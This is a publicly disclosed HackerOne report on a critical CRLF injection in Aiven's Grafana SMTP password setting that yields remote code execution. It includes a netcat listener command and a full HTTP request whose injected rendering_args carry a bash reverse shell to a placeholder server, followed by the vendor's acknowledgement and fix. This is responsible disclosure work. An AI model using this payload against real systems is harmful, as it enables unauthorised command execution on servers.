---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/crlf-injection
  - env/network
substate: "resolved"
weakness: "CRLF Injection"
enriched: true
body: true
date: 2022-11-08
submitted: 2021-05-18T07:33:54.133Z
bounty_usd: 5000
votes: 72
cve: []
program: "[[programs/aiven_ltd|Aiven Ltd]]"
reporter: "jarij"
source: "https://hackerone.com/reports/1200647"
title: "Grafana RCE via SMTP server parameter injection"
---
# Grafana RCE via SMTP server parameter injection

> **Severity:** Critical | **Bounty:** 5,000 USD | **Votes:** 72 | **Program:** Aiven Ltd | **Disclosed:** 2022-11-08

- Report: [https://hackerone.com/reports/1200647](https://hackerone.com/reports/1200647)
- CWE: CRLF Injection
- Submitted: 2021-05-18T07:33:54.133Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:

This report is similar to [#1180653](https://hackerone.com/reports/1180653), except with different parameter injection entrypoint.

SMTP server password configuration setting accepts new line characters. This can be used to set non-exported configuration variables. Using this CRLF-injection, the `rendering_args` of grafana image renderer can be modified which leads to code execution on the Grafana server.

## Steps To Reproduce:

1.Create Aiven Grafana instance
2.Setup netcat listener on your server: `nc -n -lvp 4444`
3.Send the following request to the grafana instance, replace place holders. The aivenv1 token can be retrieved by inspecting the browser traffic.
4. Browse to https://INSTANCE_SUBDOMAIN.aivencloud.com/render/x to trigger the exploit.

```http
PUT /v1/project/PROJECT_NAME/service/GRAFANA_INSTANCE_NAME HTTP/1.1
Host: console.aiven.io
Connection: keep-alive
Accept: application/json
Authorization: aivenv1 AIVEN_TOKEN_HERE
X-Aiven-Client-Version: aiven-console/3.5.1-1104.g2809991854
Content-Type: application/json
Origin: https://console.aiven.io

{
    "user_config": {
        "smtp_server": {
            "host": "example.org",
            "port": 1,
            "from_address": "x@examle.org",
            "password": "x\r\n[plugin.grafana-image-renderer]\r\nrendering_args=--renderer-cmd-prefix=bash -c bash$IFS-l$IFS>$IFS/dev/tcp/SERVER_IP/4444$IFS0<&1$IFS2>&1"
        }
    }
}
```

## Impact

Command execution on the grafana server. Access and modify data on the grafana server and possibly the attacker could pivot into other servers on the aiven network.

## Timeline

- **Report Filed**
- **Report Triaged**
- **2021-05-20** @staaldraad_aiven: Hi @lugtag 

Thank you for another good submission :)

We are going to make an exception and treat this as a newly reported bug, even though we had already identified this and several other parameters as vulnerable shortly after fixing the previously reported issue.

For what it is worth, the `username` and `from_name` parameters are also vulnerable (although with the username you need to use a shorter payload).

We are currently working on a larger fix that will address not only these individual parameters, but also provide stronger validation by default. This work is ongoing and we definitely look forward to you testing the fix to see if you can find a bypass :)

I'll post updates to this report as they become available.

Again, great find and thanks again for reporting!
- **2021-05-20** @jarij: Hey, @staaldraad_aiven

Glad to hear! Sure, I will continue testing for these types of bugs when the fix is deployed.

BR,
@jarij
- **Bounty Awarded**
- **2021-05-24** @staaldraad_aiven: Hey @jarij 

Just a quick update, along with the bounty, we have a first line fix waiting to deploy. We are still working on further defence in depth measures, but with this fix we believe the issue should be fixed soon.

Best,
Etienne
team Aiven
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
